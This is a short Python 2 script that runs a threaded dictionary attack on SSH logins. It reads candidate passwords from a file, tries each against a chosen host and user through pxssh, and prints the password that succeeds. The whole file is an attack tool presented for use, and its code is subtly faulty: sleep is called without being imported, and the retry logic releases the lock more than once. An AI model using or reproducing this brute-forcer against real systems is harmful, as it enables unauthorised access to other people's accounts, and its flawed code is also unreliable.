#encoding:utf-8
import pxssh;
import optparse;
import threading;
import time;

LOCK = threading.BoundedSemaphore(value=5);
def CheckPwd(Host,User,Pwd):
	try:
		PxsshObj = pxssh.pxssh();
		PxsshObj.login(Host,User,Pwd);
		print "[*]Password :"+Pwd;
		exit(0);
	except Exception,e:
		print "[-] Exception :"+str(e)+"-Error password:"+Pwd;
		if 'read_nonblocking' in str(e):
			sleep(5);
			CheckPwd(Host,User,Pwd);
		elif 'synchrnonize with original prompt' in str(e):
			sleep(1);
			CheckPwd(Host,User,Pwd);
	finally:
		LOCK.release();
	None;
	



def main():
	parser = optparse.OptionParser("Usage: Python Script.py -U <UserId> -H <Host> -D <DictionaryFileName>");
	parser.add_option("-H","--Host",dest="Host",type="string",help="Host eg:192.168.0.103|localhost");
	parser.add_option("-U","--User",dest="User",type="string",help="User Name eg:root/jh");
	parser.add_option("-D","--Dictionary",dest="Dfn",type="string",help="need a dictionary file name");
	(options,args)=parser.parse_args();
	DicFileName = options.Dfn;
	Host = options.Host;
	User = options.User;
	if(DicFileName == None or Host == None or User == None):
		print "[!]Argument need 3 ";
		exit(0);
	fp = open(DicFileName,"r");
	#print fp.readline();
	for CurRow in fp.readlines():
		pwd = CurRow.strip("\n").strip("\r");
		#CheckPwd(Host,User,pwd);
		LOCK.acquire();
		threading.Thread(target=CheckPwd,args=(Host,User,pwd)).start();



if __name__ == "__main__":
	#
	main();
